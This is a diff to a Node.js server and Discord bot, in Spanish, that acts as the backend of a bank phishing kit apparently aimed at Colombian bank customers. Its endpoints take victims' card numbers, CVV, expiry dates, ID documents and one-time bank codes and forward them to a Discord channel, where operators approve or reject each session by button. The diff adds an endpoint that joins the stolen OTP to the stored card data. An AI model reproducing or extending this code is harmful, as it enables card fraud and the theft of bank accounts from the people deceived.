@@ -104,7 +104,7 @@ function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
     return embed;
 }
 
-// 🆕 NUEVO — Embed para pagos con Tarjeta (Visa/Mastercard)
+// 🆕 Embed para pagos con Tarjeta (Visa/Mastercard)
 function buildEmbedTarjeta(banco, bancoKey, datos, sessionId) {
     const { marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
 
@@ -122,6 +122,32 @@ function buildEmbedTarjeta(banco, bancoKey, datos, sessionId) {
             { name: '👤 Titular', value: titular || '(vacío)', inline: false },
             { name: '📄 Documento', value: `${docType || 'CC'} ${docNumber || '(vacío)'}`, inline: true },
             { name: '💰 Monto', value: `$${Number(monto || 0).toLocaleString('es-CO')} COP`, inline: true }
+        );
+
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
+    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
+
+    return embed;
+}
+
+// 🆕 Embed para OTP de Tarjeta (con datos de tarjeta + código)
+function buildEmbedOtpTarjeta(banco, bancoKey, datos, sessionId, otpValor) {
+    const { marca, tarjeta, titular, docType, docNumber, monto } = datos;
+
+    const marcaTexto = marca === 'visa' ? 'VISA' : 'MASTERCARD';
+    const colorMarca = marca === 'visa' ? 0x1434CB : 0xEB001B;
+
+    const embed = new EmbedBuilder()
+        .setTitle(`🔐 ${marcaTexto} - Clave Dinámica`)
+        .setColor(colorMarca)
+        .addFields(
+            { name: '🏷️ Marca', value: marcaTexto, inline: true },
+            { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
+            { name: '👤 Titular', value: titular || '(vacío)', inline: false },
+            { name: '📄 Documento', value: `${docType || 'CC'} ${docNumber || '(vacío)'}`, inline: true },
+            { name: '💰 Monto', value: `$${Number(monto || 0).toLocaleString('es-CO')} COP`, inline: true },
+            { name: '📱 Clave Dinámica', value: `\`${otpValor}\``, inline: false }
         );
 
     const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
@@ -257,7 +283,7 @@ const server = http.createServer(async (req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // ─── POST /cc-bogota/enviar-pago ──────────────────── 🆕 NUEVO
+    // ─── POST /cc-bogota/enviar-pago ────────────────────
     const pagoTarjetaMatch = req.url.match(/^\/cc-bogota\/enviar-pago$/);
     if (req.method === 'POST' && pagoTarjetaMatch) {
         const bancoKey = 'cc-bogota';
@@ -308,6 +334,68 @@ const server = http.createServer(async (req, res) => {
                 res.end(JSON.stringify({ ok: true, sessionId }));
             } catch (err) {
                 console.error(`❌ [${bancoKey}] Error /enviar-pago:`, err);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ─── POST /cc-bogota/enviar-otp ──────────────────── 🆕 NUEVO
+    const otpTarjetaMatch = req.url.match(/^\/cc-bogota\/enviar-otp$/);
+    if (req.method === 'POST' && otpTarjetaMatch) {
+        const bancoKey = 'cc-bogota';
+        const banco = bancos[bancoKey];
+
+        if (!banco) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ ok: false, error: 'Banco cc-bogota no existe' }));
+            return;
+        }
+
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const datos = JSON.parse(body);
+                const { sessionId, otp } = datos;
+
+                if (!sessionId || !otp) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ ok: false, error: 'sessionId y otp requeridos' }));
+                    return;
+                }
+
+                // Recuperar datos de la sesión original (tarjeta, titular, etc.)
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosOriginales, { otp });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+
+                console.log(`📱 [${bancoKey}] OTP recibido: ${sessionId} → ${otp}`);
+
+                const embed = buildEmbedOtpTarjeta(banco, bancoKey, datosCompletos, sessionId, otp);
+
+                const row = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder()
+                        .setCustomId(`ACEPTAR|${bancoKey}|${sessionId}`)
+                        .setLabel('✅ Aceptar')
+                        .setStyle(ButtonStyle.Success),
+                    new ButtonBuilder()
+                        .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+                        .setLabel('❌ Rechazar')
+                        .setStyle(ButtonStyle.Danger)
+                );
+
+                const channel = await client.channels.fetch(banco.canalId);
+                await channel.send({ embeds: [embed], components: [row] });
+
+                console.log(`📨 [${bancoKey}] Embed OTP enviado a canal ${banco.canalId}`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true, sessionId }));
+            } catch (err) {
+                console.error(`❌ [${bancoKey}] Error /enviar-otp:`, err);
                 res.writeHead(500, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ ok: false, error: err.message }));
             }
@@ -413,9 +501,9 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ─── POST /:banco/enviar-otp ──────────────────
+    // ─── POST /:banco/enviar-otp (para PSE tradicional) ───
     const otpMatch = req.url.match(/^\/([a-z-]+)\/enviar-otp$/);
-    if (req.method === 'POST' && otpMatch) {
+    if (req.method === 'POST' && otpMatch && otpMatch[1] !== 'cc-bogota') {
         const bancoKey = otpMatch[1];
         const banco = bancos[bancoKey];
 
@@ -515,7 +603,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const sessionId = partes[2];
     const usuario = interaction.user.username;
 
-    if (accion === 'ACEPTAR') {  // 🆕 NUEVO
+    if (accion === 'ACEPTAR') {
         estadoSesiones.set(sessionId, 'aceptado');
         console.log(`✅ [${bancoKey}] ACEPTADO: ${sessionId}`);
         await interaction.reply({ content: `✅ Sesión **${sessionId}** ACEPTADA por ${usuario}` });
